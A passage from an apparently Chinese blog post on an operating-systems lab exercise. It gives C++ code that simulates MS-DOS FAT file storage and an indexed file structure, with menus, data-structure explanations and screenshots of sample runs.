class="hljs-comment">//记录当前地址，实际的复制内容由下一个块的地址决定</span><br>        lastpos = pos;<br>        <span class="hljs-comment">//从下一个块开始找，空出当前地址留待使用</span><br>        pos++;<br>        <span class="hljs-comment">//剩余的块少一个</span><br>        leftblocks--;<br>    &#125;<br>    <span class="hljs-comment">//将文件的结尾执行统一的结束符 FFF</span><br>    fat[lastpos] = <span class="hljs-number">1</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********文件存储成功！********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//插入文件操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入文件名:&quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//首先查找文件目录中是否有这个文件</span><br>    <span class="hljs-comment">//如果有这个文件则记录在文件目录中的索引</span><br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">FindFile</span>(filename);<br>    <span class="hljs-comment">//如果没有这个文件则插入不能完成</span><br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********不存在该文件，插入失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//将这个块插入到文件的第 num 个位置</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入要插入的文件逻辑位置:&quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//判断是否有空间存储这个插入的块</span><br>    <span class="hljs-keyword">if</span> (leftblocks == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********无空闲块，插入失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//找一个空闲的位置来存放要插入的块</span><br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (fat[p] != <span class="hljs-number">0</span>)<br>        p++;<br>    <span class="hljs-comment">//如果要在第一个位置插入，则更新起始块号</span><br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>)<br>    &#123;<br>        fat[p] = fd.start[pos];<br>        fd.start[pos] = p;<br>    &#125;<br>    <span class="hljs-comment">//不是在第一个位置插入</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-comment">//找到要插入位置的前一个块号</span><br>        <span class="hljs-keyword">int</span> temp = fd.start[pos];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; num - <span class="hljs-number">1</span>; i++)<br>            temp = fat[temp];<br>        <span class="hljs-comment">//将新的位置的下一个索引指向原来的下一个块</span><br>        fat[p] = fat[temp];<br>        <span class="hljs-comment">//将上一个块的下一个索引指向新的位置，完成插入</span><br>        fat[temp] = p;<br>    &#125;<br>    <span class="hljs-comment">//更新剩余的内存块</span><br>    leftblocks--;<br>    fd.filelength[pos]++;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********插入文件块成功！********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//输出文件目录和 fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------文件目录------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  文件名   起始位置  逻辑长度  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---文件定位表(fat)--|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    索引    内容    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      0      FDF    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      1      FFF    |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %4d    %4d     |\n&quot;</span>, i, fat[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//功能选择清单</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">choicelist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|-----------------------MS-DOS磁盘文件存储管理菜单-------------------|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      1.向fat中存储一个文件:                        |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      2.向fat中的文件插入数据:                      |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      3.输出当前文件目录以及fat信息:                |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      4.结束操作，退出系统:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">int</span> order;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-comment">//通过字符串输入来选择想要测试的功能</span><br>        <span class="hljs-built_in">choicelist</span>();<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入你要执行的操作的编号: &quot;</span>;<br>        cin &gt;&gt; order;<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (order)<br>        &#123;<br>        <span class="hljs-comment">//存 一个文件</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">save</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//在指定的文件中的特定位置插入一个块</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">insert</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//显示当前的系统信息</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">info</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//测试结束退出系统3</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;系统结束&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//输入指令不合法</span><br>        <span class="hljs-keyword">default</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;指令输入错误&quot;</span> &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p>初态</p><p><img src="/posts/6255939a/image-20211217140649270.png" alt="image-20211217140649270"></p><p>保存新文件</p><p><img src="/posts/6255939a/image-20211217140757616.png" alt="image-20211217140757616"></p><p>对新保存的文件进行插入</p><p><img src="/posts/6255939a/image-20211217140850377.png" alt="image-20211217140850377"></p><h3 id="第二题索引文件存储结构"><a class="markdownIt-Anchor" href="#第二题索引文件存储结构"></a> 第二题：索引文件存储结构</h3><h4 id="数据结构和符号说明-2"><a class="markdownIt-Anchor" href="#数据结构和符号说明-2"></a> <strong>数据结构</strong>和符号说明</h4><p>相比于上一题，增加了三个数据结构，分别是索引表、文件目录表、用户表</p><p>同时因为其结构是名称和地址的对应关系，故采用了stl数据结构中的map来反映映射关系。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Indextab</span> //索引表</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> tab[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Filetab</span>//文件目录表</span><br><span class="hljs-class">&#123;</span><br>    map&lt;string, Indextab&gt; filetab;<br>&#125;;<br>map&lt;string, Filetab&gt; usertab;<span class="hljs-comment">//用户表</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明-2"><a class="markdownIt-Anchor" href="#函数说明-2"></a> 函数说明</h4><p>相比于上一题，改动之处在于增加了一个是文件结构改变成索引结构的函数。</p><p>函数思路为首先输入用户名，然后依次要求用户输入属于自己的文件，将其加入该用户的文件表中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change_to_index</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">//打印当前文件目录</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前文件目录：\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------文件目录------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  文件名   起始位置  逻辑长度  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入用户名，按q退出\n&quot;</span>);<br>        string name;<br>        cin &gt;&gt; name;<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;q&quot;</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入当前用户的文件名，按q退出\n&quot;</span>);<br>                string file;<br>                cin &gt;&gt; file;<br>                <span class="hljs-keyword">if</span> (file == <span class="hljs-string">&quot;q&quot;</span>)<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">int</span> t = <span class="hljs-built_in">FindFile</span>(file);<br>                    <span class="hljs-keyword">if</span> (!t)<br>                    &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不存在该文件，请重新输入文件名：&quot;</span>);<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        usertab[name].filetab[file].length = <span class="hljs-number">0</span>;<span class="hljs-comment">//初始化用户文件表记录数</span><br>                        <span class="hljs-keyword">int</span> cpos = fd.start[t];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fd.filelength[t]; i++)<br>                        &#123;<br>                            usertab[name].filetab[file].tab[i] = cpos;<span class="hljs-comment">//记录物理块号</span><br>                            cpos = fat[cpos];<span class="hljs-comment">//到下一个物理块</span><br>                            usertab[name].filetab[file].length++;<span class="hljs-comment">//记录数加一</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="源代码-2"><a class="markdownIt-Anchor" href="#源代码-2"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// MS-DOS 磁盘文件存储结构</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FDF -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FFF -2</span><br><span class="hljs-comment">//文件定位表 fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//主存剩余块的数量</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//文件目录</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件起始块号</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件数量</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Indextab</span> //索引表</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> tab[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Filetab</span>//文件目录表</span><br><span class="hljs-class">&#123;</span><br>    map&lt;string, Indextab&gt; filetab;<br>&#125;;<br>map&lt;string, Filetab&gt; usertab;<span class="hljs-comment">//用户表</span><br><br><span class="hljs-comment">//初始化函数，重置 fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        fat[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//将第一位设置为 FDF</span><br>    fat[<span class="hljs-number">0</span>] = <span class="hljs-number">-2</span>;<br>    <span class="hljs-comment">//将第二位设置成所有文件的结束 FFF</span><br>    fat[<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>    leftblocks -= <span class="hljs-number">2</span>;<br>    fd.filenum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name &lt;&lt; endl;</span><br>    fd.name[++fd.filenum] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name[fd.filenum] &lt;&lt; endl;</span><br>    fd.start[fd.filenum] = <span class="hljs-number">2</span>;<br>    fat[<span class="hljs-number">2</span>] = <span class="hljs-number">5</span>; <span class="hljs-comment">//初始化第一个文件</span><br>    fat[<span class="hljs-number">5</span>] = <span class="hljs-number">8</span>;<br>    fat[<span class="hljs-number">8</span>] = <span class="hljs-number">11</span>;<br>    fat[<span class="hljs-number">11</span>] = <span class="hljs-number">18</span>;<br>    fat[<span class="hljs-number">18</span>] = <span class="hljs-number">24</span>;<br>    fat[<span class="hljs-number">24</span>] = FFF;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">6</span>;<br><br>    fd.name[++fd.filenum] = <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-comment">//初始化第二个文件</span><br>    fd.start[fd.filenum] = <span class="hljs-number">6</span>;<br>    fat[<span class="hljs-number">6</span>] = <span class="hljs-number">9</span>;<br>    fat[<span class="hljs-number">9</span>] = <span class="hljs-number">14</span>;<br>    fat[<span class="hljs-number">14</span>] = <span class="hljs-number">19</span>;<br>    fat[<span class="hljs-number">19</span>] = <span class="hljs-number">22</span>;<br>    fat[<span class="hljs-number">22</span>] = <span class="hljs-number">28</span>;<br>    fat[<span class="hljs-number">28</span>] = <span class="hljs-number">30</span>;<br>    fat[<span class="hljs-number">30</span>] = FFF;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">7</span>;<br>&#125;<br><br><span class="hljs-comment">//寻找相同文件名的条目</span><br><span class="hljs-comment">//找到就返回在文件目录中的索引</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">FindFile</span><span class="hljs-params">(string filename)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-keyword">if</span> (fd.name[i] == filename)<br>            <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* int finduser(string name)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    map&lt;string, Filetab&gt;::iterator iter;</span><br><span class="hljs-comment">    iter = usertab.find(name);</span><br><span class="hljs-comment">    if (iter == usertab.end())</span><br><span class="hljs-comment">        return 0;</span><br><span class="hljs-comment">    else</span><br><span class="hljs-comment">        return 1;</span><br><span class="hljs-comment">&#125; */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入文件名: &quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//首先寻找是不是有同名的文件</span><br>    <span class="hljs-comment">//如果有则不能重复插入</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FindFile</span>(filename) != <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********存在同名文件，存操作执行失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入逻辑记录长度: &quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//检查内存剩余的空间是不是够存储</span><br><br>    <span class="hljs-keyword">if</span> (num &gt; leftblocks)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********存储的文件过大，无法存储！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//记录文件名称</span><br>    fd.name[++fd.filenum] = filename;<br>    fd.filelength[fd.filenum] = num;<br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>, lastpos;<br>    <span class="hljs-comment">//找 num 